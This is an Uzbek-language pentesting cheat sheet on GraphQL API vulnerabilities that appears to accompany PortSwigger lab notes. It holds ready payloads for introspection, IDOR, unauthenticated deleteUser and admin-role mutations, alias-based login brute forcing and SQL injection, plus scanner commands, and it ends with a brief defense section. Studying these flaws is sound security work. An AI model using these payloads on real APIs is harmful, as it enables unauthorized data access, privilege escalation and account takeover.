# GraphQL API Vulnerabilities

> Lab yechimlari (PortSwigger'ning 5 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
GraphQL — bitta endpoint (`/graphql`) orqali mijoz **aynan kerakli** ma'lumotni so'raydigan
so'rov tili. Kuchli, lekin aynan shu moslashuvchanlik xavf: **introspection** butun schema'ni
oshkor qiladi, **aliasing/batching** bitta so'rovda yuzlab amal bajaradi (rate-limit'ni aylanadi),
va REST'dagi avtorizatsiya zaifliklari (IDOR) bu yerda ham qoladi.

**Ildiz sabab:** GraphQL faqat "ma'lumot qanday so'raladi"ni hal qiladi, **avtorizatsiyani emas**.
Dasturchilar prod'da introspection'ni o'chirmaydi, field-level ruxsatni unutadi, yoki rate-limit'ni
so'rovlar soni bo'yicha qo'yadi (alias bilan aylanadi). Ko'p maydon tasodifan ochiq qoladi.

## Turlari
- **Introspection abuse** — `__schema` so'rovi bilan butun API strukturasi, yashirin query/mutation.
- **Accidental field exposure** — schema'da `password` kabi maydon tasodifan so'ralsa bo'ladigan.
- **IDOR via id argument** — `getUser(id:N)` orqali boshqa foydalanuvchi ma'lumoti.
- **Hidden mutation** — `deleteUser`/`makeAdmin` auth'siz qolgan.
- **Batching/aliasing abuse** — bitta so'rovда ko'p login → OTP/parol brute, rate-limit bypass.
- **CSRF via GraphQL** — `x-www-form-urlencoded` POST'ni CSRF token'siz qabul qilishi.

## Oqibatlar (IMPACT)
- **Introspection** → butun API xaritasi, yashirin funksiyalar.
- **IDOR** → boshqa user ma'lumoti (eng ko'p to'laydi).
- **Yashirin mutation** → auth'siz o'chirish/admin qilish.
- **Batching** → OTP/parol brute, rate-limit bypass; CSRF → ATO.
> IDOR/auth bypass chiqsa **High**.

## Endpoint topish
```
/graphql  /api/graphql  /v1/graphql  /graphiql  /playground  /query  /gql
```

## Hujumlar

### Introspection (schema leak)
```json
{"query":"query{__schema{types{name fields{name}}}}"}
```
> Javob bersa — butun API ochildi, yashirin query/mutationlarni ko'rasan.

### IDOR
```graphql
query { user(id: 1338) { email phone } }
```

### Yashirin mutation (auth bypass)
```graphql
mutation { deleteUser(id: 1338) }
mutation { updateUser(id: 1, role: "admin") }
```

### Batching/aliasing (rate-limit bypass)
```graphql
mutation {
  a: login(user:"x", pass:"1111")
  b: login(user:"x", pass:"2222")
  c: login(user:"x", pass:"3333")
}
```

### Injection argument orqali
```graphql
query { user(id: "1 OR 1=1") { ... } }     # SQLi
```

## TOOLLAR

### graphw00f — engine fingerprint
```bash
graphw00f -d -f -t https://target.com/graphql
```
> Qaysi GraphQL engine (Apollo, Hasura...) ekanini aniqlaydi — keyin shunga mos hujum.

### InQL (Burp extension) — introspection + query generatsiya
```
Burp → InQL → endpoint qo'y → schema'ni tortib, tayyor query/mutation yasaydi
```
> Introspection'dan hamma query/mutationni avtomat yasab, Repeater'ga tashlaydi.

### clairvoyance — introspection o'chiq bo'lsa schema tiklash
```bash
clairvoyance -o schema.json https://target.com/graphql
```
> Field suggestion ("did you mean?") xatolaridan butun schema'ni qaytadan tiklaydi.

### graphql-cop — xavfsizlik auditi
```bash
graphql-cop -t https://target.com/graphql
```
> Introspection, batching, field suggestion, CSRF kabi misconfig'larni tez tekshiradi.

### nuclei — ma'lum GraphQL teshiklar
```bash
nuclei -u https://target.com/graphql -tags graphql
```
> Ochiq introspection, GraphiQL panel kabilarni ommaviy topadi.

## PoC
Eng kuchli: IDOR (boshqa user ma'lumoti) yoki yashirin mutation bilan auth bypass.

## Himoya
Prod'da introspection+field suggestion o'chiq, har resolver'da authorization (IDOR),
query depth+complexity+rate limit, batching limiti, input validation.
